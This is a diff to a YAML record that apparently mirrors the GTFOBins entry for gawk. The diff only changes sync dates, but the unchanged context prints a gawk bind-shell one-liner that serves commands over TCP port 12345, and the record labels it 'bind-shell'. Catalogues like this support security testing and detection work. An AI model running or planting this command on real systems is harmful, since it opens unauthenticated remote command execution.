@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s\
     \ |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
@@ -31,7 +31,7 @@ source_data:
       context: unprivileged
     upstream_url: https://gtfobins.github.io/gtfobins/gawk/
     upstream_version: acd5246
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: bind-shell
@@ -67,6 +67,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     GTFOBins: sha256:811449ab94781a44cb8a9704581ac6773e6d95cac3b93ea32b2fdd5ea44f0bf8
